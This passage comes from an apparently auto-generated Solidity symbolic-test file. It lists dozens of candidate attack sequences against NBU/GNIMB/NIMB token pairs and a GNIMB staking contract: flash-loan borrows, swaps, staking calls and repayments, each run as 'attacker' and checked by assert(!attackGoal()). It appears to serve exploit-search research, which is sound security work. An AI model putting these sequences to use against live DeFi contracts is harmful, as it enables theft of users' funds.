        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5199(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5200(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5201(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5202(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5203(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5204(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5205(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5206(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5207(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5208(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5209(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5210(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5211(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5212(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5213(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5214(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5215(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5216(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5217(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5218(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5219(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5220(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5221(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5222(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5223(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5224(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5225(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5226(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5227(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5228(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5229(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5230(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5231(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5232(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5233(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5234(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5235(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5236(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5237(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5238(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5239(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5240(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5241(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5242(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5243(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
